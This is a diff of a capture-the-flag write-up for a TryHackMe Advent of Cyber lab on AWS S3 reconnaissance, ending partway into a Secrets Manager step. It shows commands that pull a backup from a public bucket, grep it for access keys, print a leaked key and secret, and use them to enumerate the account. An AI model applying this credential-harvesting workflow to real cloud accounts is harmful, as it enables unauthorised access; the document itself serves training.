@@ -1,29 +1,23 @@
 # TryHackMe [Advent of Cyber 3](https://tryhackme.com/room/adventofcyber3) Day 17
 
 ### References
-
--   Cyber Insecurity. (2021). Advent of Cyber 3 (2021) - AWS S3 Recon & Data Exfil - Elf Leaks - TryHackMe [YouTube Video]. In YouTube. https://youtu.be/RAgvdpvKJa0
+* Cyber Insecurity. (2021). Advent of Cyber 3 (2021) - AWS S3 Recon & Data Exfil - Elf Leaks - TryHackMe [YouTube Video]. In YouTube. https://youtu.be/RAgvdpvKJa0
+* The AWS CLI and `curl` were installed in my Kali Linux environment by running `sudo apt install awscli curl`.
 
 ## What is the name of the S3 Bucket used to host the HR Website announcement?
-
--   The AWS CLI was installed in my Kali Linux environment by running `sudo apt install awscli`.
--   The provided email (URL of <https://s3.amazonaws.com/images.bestfestivalcompany.com/flyer.png>) suggests the S3 bucket name:
+* The provided email (URL of <https://s3.amazonaws.com/images.bestfestivalcompany.com/flyer.png>) suggests the S3 bucket name:
     ![PNG from AWS S3](https://s3.amazonaws.com/images.bestfestivalcompany.com/flyer.png)
 
 **Answer**: `images.bestfestivalcompany.com`
-
 ## What is the message left in the `flag.txt` object from that bucket?
-
 ```
 $ curl https://s3.amazonaws.com/images.bestfestivalcompany.com/flag.txt
 It's easy to get your elves data when you leave it so easy to find!
 ```
 
 **Answer**: `It's easy to get your elves data when you leave it so easy to find!`
-
 ## What other file in that bucket looks interesting to you?
-
--   The `wp-backup.zip` stands-out because rarer-in-comparison file extension:
+* The `wp-backup.zip` stands-out because rarer-in-comparison file extension:
 
 ```bash
 $ aws s3 ls s3://images.bestfestivalcompany.com --no-sign-request
@@ -39,11 +33,8 @@ $ aws s3 ls s3://images.bestfestivalcompany.com --no-sign-request
 ```
 
 **Answer**: `wp-backup.zip`
-
 ## What is the AWS Access Key ID in that file?
-
 1. Downloads the WordPress back-up archive:
-
 ```bash
 $ aws s3 cp s3://images.bestfestivalcompany.com/wp-backup.zip . --no-sign-request
 download: s3://images.bestfestivalcompany.com/wp-backup.zip to ./wp-backup.zip
@@ -51,27 +42,21 @@ $ unzip wp-backup.zip
 ```
 
 2. `grep` for the common access key prefix `AKIA`:
-
 ```bash
 $ grep "AKIA" wp_backup/*
 wp_backup/wp-config.php:define('S3_UPLOADS_KEY', 'AKIAQI52OJVCPZXFYAOI');
 ```
 
 **Answer**: `AKIAQI52OJVCPZXFYAOI`
-
 ## What is the AWS Account ID that access-key works for?
-
 1. From `grep`ping for the access key ID, we can find the access key secret and other details in the file `wp_backup/wp-config.php`:
-
 ```php
 define('S3_UPLOADS_BUCKET', 'images.bestfestivalcompany.com');
 define('S3_UPLOADS_KEY', 'AKIAQI52OJVCPZXFYAOI');
 define('S3_UPLOADS_SECRET', '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');
 define('S3_UPLOADS_REGION', 'us-east-1');
 ```
-
 2. Create a new local AWS CLI profile using the details from the PHP code:
-
 ```bash
 $ aws configure --profile thm
 AWS Access Key ID [None]: AKIAQI52OJVCPZXFYAOI
@@ -79,9 +64,7 @@ AWS Secret Access Key [None]: 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
 Default region name [None]: us-east-1
 Default output format [None]:
 ```
-
 3. Obtain the account ID number:
-
 ```bash
 $ aws sts get-access-key-info --access-key-id AKIAQI52OJVCPZXFYAOI --profile thm
 {
@@ -90,9 +73,7 @@ $ aws sts get-access-key-info --access-key-id AKIAQI52OJVCPZXFYAOI --profile thm
 ```
 
 **Answer**: `019181489476`
-
 ## What is the Username for that access-key?
-
 ```bash
 $ aws sts get-caller-identity --profile thm
 {
@@ -103,9 +84,7 @@ $ aws sts get-caller-identity --profile thm
 ```
 
 **Answer**: `ElfMcHR@bfc.com`
-
 ## There is an EC2 Instance in this account. Under the TAGs, what is the Name of the instance?
-
 ```bash
 $ aws ec2 describe-instances --output text --profile thm
 RESERVATIONS    019181489476    043234062703    r-0e89ba65b28a7c699
@@ -134,7 +113,6 @@ TAGS    Name    HR-Portal
 ```
 
 **Answer**: `HR-Portal`
-
 ## What is the database password stored in Secrets Manager?
 1. Get secret name:
 ```bash
